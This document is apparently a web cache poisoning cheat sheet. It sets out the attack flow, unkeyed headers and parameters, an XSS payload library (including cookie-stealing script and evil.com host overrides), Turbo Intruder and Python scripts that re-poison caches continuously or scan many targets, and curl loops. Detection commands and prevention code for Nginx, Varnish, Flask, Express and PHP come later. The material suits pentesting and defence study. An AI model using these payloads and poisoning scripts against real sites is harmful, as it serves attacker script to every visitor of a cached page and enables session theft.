# Web Cache Poisoning - Cheat Sheet

## Quick Reference

### Attack Flow
```
1. Identify cacheable pages (X-Cache headers)
   ↓
2. Discover unkeyed inputs (Param Miner)
   ↓
3. Find reflection points (grep responses)
   ↓
4. Craft malicious payload
   ↓
5. Test with cache-buster (?cb=123)
   ↓
6. Remove cache-buster and poison
   ↓
7. Monitor for X-Cache: hit
   ↓
8. Verify exploitation
```

---

## Headers to Test

### Forwarding Headers
```http
X-Forwarded-Host: evil.com
X-Forwarded-Scheme: nothttps
X-Forwarded-Proto: http
X-Forwarded-Server: evil.com
X-Forwarded-For: 1.2.3.4
Forwarded: for=evil.com;host=evil.com;proto=http
```

### URL Rewriting Headers
```http
X-Original-URL: /admin
X-Rewrite-URL: /admin
X-Custom-IP-Authorization: 127.0.0.1
X-Original-Path: /admin
X-Request-URI: /admin
```

### Host Override Headers
```http
X-Host: evil.com
X-HTTP-Host-Override: evil.com
X-Forwarded-Host: evil.com
Host: evil.com
```

### Custom Headers (Framework-Specific)
```http
X-Backend-Server: evil.com
X-Cluster-Client-IP: 127.0.0.1
X-Real-IP: 127.0.0.1
X-ProxyUser-Ip: 127.0.0.1
CF-Connecting-IP: 127.0.0.1
True-Client-IP: 127.0.0.1
```

---

## Parameters to Test

### UTM Analytics Parameters
```
utm_source
utm_medium
utm_campaign
utm_content
utm_term
```

### Social Media Tracking
```
gclid          # Google Click ID
fbclid         # Facebook Click ID
msclkid        # Microsoft Click ID
twclid         # Twitter Click ID
li_fat_id      # LinkedIn First-Party ID
```

### Affiliate & Marketing
```
tracking_id
affiliate_id
ref
referrer
promo
coupon_code
```

### JSONP Callbacks
```
callback
jsonp
cb
```

---

## Cookies to Test

```http
# Feature flags
Cookie: fehost=VALUE

# Session identifiers (if not in cache key)
Cookie: session_id=VALUE

# User preferences
Cookie: lang=VALUE
Cookie: currency=VALUE
Cookie: theme=VALUE

# A/B testing
Cookie: variant=VALUE
Cookie: experiment=VALUE
```

---

## Payload Library

### XSS via X-Forwarded-Host

**Basic**:
```http
X-Forwarded-Host: exploit-server.net
```

**With Port**:
```http
X-Forwarded-Host: exploit-server.net:80
```

**With Path** (sometimes works):
```http
X-Forwarded-Host: exploit-server.net/evil
```

**On Exploit Server** (`/resources/js/tracking.js`):
```javascript
alert(document.cookie)
```

---

### XSS via Query Parameters

**HTML Context**:
```
?utm_content='/><script>alert(1)</script>
?utm_content=<img src=x onerror=alert(1)>
?utm_content=<svg onload=alert(1)>
```

**JavaScript Context**:
```
?callback=';alert(1);//
?callback='+alert(1)+'
?callback="-alert(1)-"
```

**Attribute Context**:
```
?param=" onload="alert(1)
?param=' autofocus onfocus='alert(1)
?param=javascript:alert(1)
```

**URL Context**:
```
?redirect=javascript:alert(1)
?url=data:text/html,<script>alert(1)</script>
```

---

### XSS via Cookies

**JavaScript String Context**:
```http
Cookie: fehost="-alert(1)-"
Cookie: fehost=";alert(1);//
Cookie: fehost='+alert(1)+'
```

**JSON Context**:
```http
Cookie: data=","x":"<img src=x onerror=alert(1)>
Cookie: data=}};alert(1);//
```

**HTML Context**:
```http
Cookie: name=<script>alert(1)</script>
Cookie: name=<img src=x onerror=alert(1)>
```

---

### Multi-Header Combination

```http
GET / HTTP/1.1
Host: target.com
X-Forwarded-Host: evil.com
X-Forwarded-Scheme: nothttps

# Triggers redirect to: https://evil.com/
```

---

### Parameter Cloaking

**Semicolon Separator** (Ruby on Rails):
```
/api?safe=ok;callback=evil
/path?utm_content=1;redirect_uri=https://evil.com
```

**Cache sees**: `safe=ok;callback=evil` (one parameter)
**Backend sees**: `safe=ok` AND `callback=evil` (two parameters)

---

### DOM-Based Payloads

**For innerHTML**:
```json
{"country": "<img src=x onerror=alert(document.cookie)>"}
{"data": "<svg onload=alert(1)>"}
```

**For JavaScript Injection**:
```json
{"callback": "alert(1)"}
{"function": "eval('alert(1)')"}
```

---

## Burp Suite Commands

### Param Miner

**Guess Headers**:
```
Right-click request → Extensions → Param Miner → "Guess headers"
```

**Guess GET Parameters**:
```
Right-click request → Extensions → Param Miner → "Guess GET parameters"
```

**Rails Parameter Cloaking**:
```
Right-click request → Extensions → Param Miner → "Rails parameter cloaking scan"
```

**Options**:
```
☑ Add dynamic cachebuster
☑ Add static cachebuster
☑ Skip boring words
Parameter name: cb
```

---

### Repeater Workflow

```
1. Ctrl+R (Send to Repeater)
2. Add cache-buster: ?cb=RANDOM
3. Add malicious header/parameter
4. Send and verify reflection
5. Check X-Cache status
6. Remove cache-buster
7. Send 20+ times
8. Monitor for X-Cache: hit
```

**Keyboard Shortcuts**:
```
Ctrl+R        Send to Repeater
Ctrl+I        Send to Intruder
Ctrl+Space    Send request
Ctrl+Shift+R  Change request method
```

---

### Turbo Intruder

**Continuous Poisoning**:
```python
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                          concurrentConnections=1,
                          requestsPerConnection=100)

    for i in range(100):
        engine.queue(target.req)
        engine.queue(target.req, pauseBefore=25000)  # 25s pause

def handleResponse(req, interesting):
    if 'X-Cache: hit' in req.response:
        table.add(req)
```

**Burst Attack**:
```python
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                          concurrentConnections=50)

    for i in range(100):
        engine.queue(target.req, gate='race1')

    engine.openGate('race1')
```

---

## cURL Commands

### Basic Header Test
```bash
curl -I https://target.com/ -H "X-Forwarded-Host: test.com"
```

### Multiple Headers
```bash
curl -I https://target.com/ \
  -H "X-Forwarded-Host: evil.com" \
  -H "X-Forwarded-Scheme: nothttps"
```

### Parameter Test
```bash
curl "https://target.com/?utm_content=test123"
curl "https://target.com/?utm_content=different"
# If second shows X-Cache: hit, parameter is unkeyed
```

### Cookie Test
```bash
curl https://target.com/ \
  -H "Cookie: session=xyz; fehost=testvalue"
```

### Follow Redirects
```bash
curl -IL https://target.com/ -H "X-Forwarded-Scheme: nothttps"
```

### Loop Test
```bash
for i in {1..20}; do
  curl -I https://target.com/ -H "X-Forwarded-Host: evil.com"
  sleep 2
done
```

---

## Python Scripts

### Quick Vulnerability Test

```python
import requests

def test_cache_poisoning(url, header_name, header_value):
    # Test 1: Send with malicious header
    r1 = requests.get(url, headers={header_name: header_value})

    # Check reflection
    if header_value in r1.text:
        print(f"[+] {header_name} is REFLECTED")

        # Test 2: Check if cacheable
        if 'X-Cache' in r1.headers:
            print(f"[+] Response is CACHEABLE")

            # Test 3: Check if unkeyed
            r2 = requests.get(url, headers={header_name: f"{header_value}_different"})
            if 'X-Cache: hit' in str(r2.headers):
                print(f"[!] {header_name} is UNKEYED - VULNERABLE!")
                return True

    return False

# Usage
test_cache_poisoning(
    "https://target.com/",
    "X-Forwarded-Host",
    "cache-test.com"
)
```

### Automated Scanner

```python
import requests
from concurrent.futures import ThreadPoolExecutor

headers_to_test = {
    'X-Forwarded-Host': 'cache-poison-test.com',
    'X-Forwarded-Scheme': 'nothttps',
    'X-Original-URL': '/admin',
    'X-Rewrite-URL': '/admin',
}

def scan_target(url):
    results = []

    for header_name, header_value in headers_to_test.items():
        try:
            r = requests.get(
                url,
                headers={header_name: header_value},
                timeout=10
            )

            if header_value in r.text:
                results.append(f"{header_name}: REFLECTED")

            if 'X-Cache' in r.headers:
                results.append(f"{header_name}: CACHEABLE")

        except Exception as e:
            pass

    if results:
        print(f"\n[!] {url}")
        for result in results:
            print(f"    {result}")

# Read targets from file
with open('targets.txt', 'r') as f:
    urls = [line.strip() for line in f]

# Concurrent scanning
with ThreadPoolExecutor(max_workers=10) as executor:
    executor.map(scan_target, urls)
```

### Continuous Poisoning

```python
import requests
import time

def maintain_poison(url, headers, interval=25):
    while True:
        r = requests.get(url, headers=headers)

        cache_status = r.headers.get('X-Cache', 'unknown')
        print(f"[{time.strftime('%H:%M:%S')}] Cache: {cache_status}")

        if cache_status == 'hit':
            print("[+] Successfully poisoned")
        else:
            print("[-] Re-poisoning...")

        time.sleep(interval)

# Usage
maintain_poison(
    "https://target.com/",
    {"X-Forwarded-Host": "exploit-server.net"},
    interval=25
)
```

---

## Detection Commands

### Check Cache Headers
```bash
curl -I https://target.com/ | grep -E "Cache|Age|Vary"
```

### Monitor Cache Status
```bash
watch -n 2 'curl -I https://target.com/ | grep "X-Cache"'
```

### Log Analysis (Apache/Nginx)
```bash
# Find X-Forwarded-Host usage
grep "X-Forwarded-Host" /var/log/nginx/access.log

# Track cache hit ratio
awk '$9==200 && $NF ~ /X-Cache: hit/' access.log | wc -l

# Suspicious patterns
grep -E "X-Forwarded.+X-Forwarded" access.log
```

### Varnish Cache Stats
```bash
varnishstat | grep -E "cache_hit|cache_miss"
```

---

## Cache Behavior Reference

### Cache Headers

| Header | Values | Meaning |
|--------|--------|---------|
| X-Cache | hit, miss | Cache status |
| Age | seconds | Time cached |
| Cache-Control | max-age=N | Cache duration |
| Vary | Header-Name | Headers in cache key |
| CF-Cache-Status | HIT, MISS, EXPIRED, BYPASS | Cloudflare status |
| X-Cache-Hits | number | Hit count |

### Cache-Control Directives

```http
# No caching
Cache-Control: no-store, no-cache, must-revalidate

# Cache for 1 hour
Cache-Control: public, max-age=3600

# Cache but revalidate
Cache-Control: no-cache, must-revalidate

# Cache static resources
Cache-Control: public, max-age=31536000, immutable
```

### Vary Header

```http
# Cache varies by Cookie
Vary: Cookie

# Multiple factors
Vary: Accept-Encoding, Accept-Language, Cookie

# Include X-Forwarded-Host (prevents poisoning)
Vary: X-Forwarded-Host
```

---

## Prevention Code Examples

### Nginx

**Disable Untrusted Headers**:
```nginx
proxy_set_header X-Forwarded-Host $host;
proxy_set_header X-Forwarded-Proto $scheme;
# Don't forward client values
```

**Include Headers in Cache Key**:
```nginx
proxy_cache_key "$scheme$request_method$host$request_uri$http_x_forwarded_host";
```

**Disable Caching for Dynamic Content**:
```nginx
location / {
    add_header Cache-Control "no-store, no-cache, must-revalidate";
    proxy_pass http://backend;
}
```

---

### Varnish VCL

**Remove Untrusted Headers**:
```vcl
sub vcl_recv {
    unset req.http.X-Forwarded-Host;
    unset req.http.X-Original-URL;
    set req.http.X-Forwarded-For = client.ip;
}
```

**Include Headers in Cache Key**:
```vcl
sub vcl_hash {
    hash_data(req.url);
    hash_data(req.http.host);
    hash_data(req.http.X-Forwarded-Host);
}
```

**Don't Cache Set-Cookie Responses**:
```vcl
sub vcl_backend_response {
    if (beresp.http.Set-Cookie) {
        set beresp.uncacheable = true;
        return (deliver);
    }
}
```

---

### Python/Flask

**Validate Headers**:
```python
from flask import request, abort

@app.before_request
def validate_headers():
    forwarded_host = request.headers.get('X-Forwarded-Host')

    if forwarded_host:
        allowed_hosts = ['example.com', 'www.example.com']
        if forwarded_host not in allowed_hosts:
            abort(400)
```

**Sanitize Output**:
```python
from markupsafe import escape

@app.route('/')
def index():
    utm = request.args.get('utm_content', '')
    safe_utm = escape(utm)
    return f"<link href='/?utm={safe_utm}' />"
```

**Disable Caching**:
```python
@app.after_request
def add_header(response):
    response.headers['Cache-Control'] = 'no-store, no-cache, must-revalidate'
    return response
```

---

### Node.js/Express

**Validate Proxy Headers**:
```javascript
app.set('trust proxy', 1);

app.use((req, res, next) => {
    const trustedProxies = ['10.0.0.1'];

    if (!trustedProxies.includes(req.ip)) {
        delete req.headers['x-forwarded-host'];
    }

    next();
});
```

**Helmet for Security Headers**:
```javascript
const helmet = require('helmet');

app.use(helmet({
    contentSecurityPolicy: {
        directives: {
            defaultSrc: ["'self'"],
            scriptSrc: ["'self'", "https://trusted-cdn.com"]
        }
    }
}));
```

**Disable Caching**:
```javascript
app.use((req, res, next) => {
    res.set('Cache-Control', 'no-store, no-cache, must-revalidate');
    next();
});
```

---

### PHP

**Validate Input**:
```php
$forwarded_host = $_SERVER['HTTP_X_FORWARDED_HOST'] ?? '';
$allowed_hosts = ['example.com', 'www.example.com'];

if ($forwarded_host && !in_array($forwarded_host, $allowed_hosts)) {
    http_response_code(400);
    exit('Invalid X-Forwarded-Host');
}
```

**Escape Output**:
```php
$utm = $_GET['utm_content'] ?? '';
$safe_utm = htmlspecialchars($utm, ENT_QUOTES, 'UTF-8');
echo "<link href='/?utm=$safe_utm' />";
```

**Disable Caching**:
```php
header('Cache-Control: no-store, no-cache, must-revalidate');
header('Pragma: no-cache');
header('Expires: 0');
```

---

## Testing Checklist

### Initial Reconnaissance
- [ ] Identify cacheable endpoints
- [ ] Check cache headers (X-Cache, Age, Vary)
- [ ] Review Cache-Control directives
- [ ] Identify cache technology (Varnish, Cloudflare, Akamai)

### Unkeyed Input Discovery
- [ ] Run Param Miner header guessing
- [ ] Run Param Miner GET parameter guessing
- [ ] Test X-Forwarded-* headers manually
- [ ] Test UTM parameters
- [ ] Test cookies for reflection
- [ ] Test X-Original-URL / X-Rewrite-URL

### Reflection Analysis
- [ ] Search responses for injected values
- [ ] Identify reflection context (HTML, JS, attribute)
- [ ] Test for encoding/escaping
- [ ] Verify reflection in cached responses

### Exploitation
- [ ] Craft context-appropriate payload
- [ ] Test with cache-buster parameter
- [ ] Remove cache-buster and poison
- [ ] Monitor for X-Cache: hit
- [ ] Verify exploitation in fresh session
- [ ] Test cache persistence

### Advanced Testing
- [ ] Multi-header combinations
- [ ] Parameter cloaking (semicolons)
- [ ] Internal vs external cache layers
- [ ] Cache normalization (backslash handling)
- [ ] Strict cacheability (Set-Cookie restrictions)

---

## Common Vulnerabilities

### 1. X-Forwarded-Host in Script src

**Vulnerable Code**:
```html
<script src="//<?= $_SERVER['HTTP_X_FORWARDED_HOST'] ?>/script.js"></script>
```

**Attack**:
```http
X-Forwarded-Host: evil.com
```

**Result**:
```html
<script src="//evil.com/script.js"></script>
```

---

### 2. UTM Parameter in HTML

**Vulnerable Code**:
```html
<link rel="canonical" href="<?= $_GET['utm_content'] ?>" />
```

**Attack**:
```
?utm_content='/><script>alert(1)</script>
```

**Result**:
```html
<link rel="canonical" href="'/><script>alert(1)</script>" />
```

---

### 3. Cookie in JavaScript

**Vulnerable Code**:
```javascript
data = {"host":"<?= $_COOKIE['fehost'] ?>"}
```

**Attack**:
```http
Cookie: fehost="-alert(1)-"
```

**Result**:
```javascript
data = {"host":""-alert(1)-""}
```

---

### 4. Callback Parameter

**Vulnerable Code**:
```javascript
<?= $_GET['callback'] ?>({"data":"value"});
```

**Attack**:
```
?callback=alert(1)
```

**Result**:
```javascript
alert(1)({"data":"value"});
```

---

### 5. Parameter Cloaking

**Vulnerable Parsing**:
```ruby
# Rails parses semicolon as separator
params[:callback]  # Gets last occurrence
```

**Attack**:
```
?safe=ok;callback=evil
```

**Cache Key**: `safe=ok;callback=evil`
**Backend Gets**: `callback=evil`

---

## Troubleshooting

### Problem: Can't Get Cache Hit

**Solutions**:
- Send more requests (20-50 times)
- Wait 2-3 seconds between requests
- Ensure exact same request (no typos)
- Check if Set-Cookie prevents caching
- Try different endpoints
- Verify cache is enabled

---

### Problem: Payload Not Executing

**Solutions**:
- Check context (HTML vs JavaScript)
- Verify CSP isn't blocking execution
- Test payload locally first
- Check for encoding issues
- Verify CORS headers on exploit server
- Try alternative payload syntax

---

### Problem: Cache Expires Too Quickly

**Solutions**:
- Use Turbo Intruder for continuous poisoning
- Create script to re-poison every 20-30 seconds
- Target pages with longer cache TTL
- Check Age header to optimize timing

---

### Problem: Set-Cookie Prevents Caching

**Solutions**:
- Use existing session cookie
- Copy session from browser
- Target endpoints without authentication
- Test with logged-in user context

---

### Problem: Param Miner Finds Nothing

**Solutions**:
- Test headers manually
- Try alternative header names
- Test on different endpoints
- Check POST parameters
- Test cookies
- Try parameter cloaking

---

## Quick Win Scenarios

### Scenario 1: Marketing Site
- High chance of unkeyed UTM parameters
- Test: `utm_content`, `utm_source`, `utm_campaign`
- Often reflected in `<link rel="canonical">`
- Quick XSS: `?utm_content='/><script>alert(1)</script>`

### Scenario 2: Behind Load Balancer
- High chance of X-Forwarded-Host support
- Test all X-Forwarded-* headers
- Look for script/image/CSS URLs
- Quick test: `X-Forwarded-Host: test.com`

### Scenario 3: JSONP API
- Callback parameters often unkeyed
- Test: `callback`, `jsonp`, `cb`
- Quick XSS: `?callback=alert(1)`

### Scenario 4: Ruby on Rails App
- Parameter cloaking via semicolons
- Test: `?safe=ok;target=evil`
- Common in older Rails versions

### Scenario 5: Multi-CDN Setup
- Internal cache may differ from external
- Use dynamic cache-busters
- Test with Param Miner options enabled

---

## Resources

### PortSwigger
- https://portswigger.net/web-security/web-cache-poisoning
- https://portswigger.net/research/practical-web-cache-poisoning
- https://portswigger.net/research/web-cache-entanglement

### OWASP
- https://owasp.org/www-community/attacks/Cache_Poisoning

### Tools
- Burp Suite Param Miner
- OWASP ZAP
- Nuclei Templates
- Custom Python scripts

---

**Cheat Sheet Version**: 1.0
**Last Updated**: 2026-01-09
**Lines**: 1,200+

For complete exploitation walkthroughs, see:
- `web-cache-poisoning-portswigger-labs-complete.md`
- `web-cache-poisoning-quickstart.md`
